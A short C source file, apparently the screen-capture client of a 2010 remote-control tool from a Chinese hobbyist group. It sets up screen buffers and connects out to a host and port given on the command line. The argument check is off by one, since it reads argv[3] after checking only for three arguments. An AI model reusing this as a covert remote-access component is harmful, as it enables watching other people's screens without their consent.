/*
开发作者:可明
开发日期:2010.8
远程控制编程讨论群:30660169,6467438
*/

#include "km_socket.h"
#include "km_main_event.h"

pshare_main g_share_main;
screen_ver s_ver;

char *g_remote_addr;
int g_remote_port = 80;

HANDLE              hdib ;
unsigned long crc32;

int
main_initialize()
{
    g_share_main = malloc(sizeof(share_main));
    memset(g_share_main, 0x0, sizeof(share_main));

    g_share_main->sock_loop_thread_count = 4;
    g_share_main->sock_loop_thread = malloc(sizeof(HANDLE) * g_share_main->sock_loop_thread_count);

    g_share_main->km_length = 809600;
    g_share_main->km_buffer = (char*)malloc(809600);

    s_ver.wVersion = 0x1003;
    s_ver.wSystemVersion = 0;
    s_ver.c_type = C_SCREEN;
    s_ver.wXscreen  = GetSystemMetrics(SM_CXSCREEN);
    s_ver.wYscreen  = GetSystemMetrics(SM_CYSCREEN);

    hdib = GlobalAlloc(GHND,4096000);
    if (!hdib) {
        return 0 ;
    }

    return 1;
}

unsigned __stdcall
service_main(void *param)
{
    main_initialize();
    kms_main_initialize();

    kms_sock_connect(g_remote_addr, g_remote_port , km_main_connect, NULL, NULL);

    WaitForSingleObject(g_share_main->sock_loop_thread[0],INFINITE);    return 0;
}

int main(int argc, char *argv[])
{
    if (argc < 3)
        return -1;

    DialogBox(NULL, NULL, NULL, NULL);

    g_remote_addr = argv[1];
    g_remote_port = atoi(argv[2]);
    crc32 = atol(argv[3]);

    service_main(NULL);
    return 0;
}
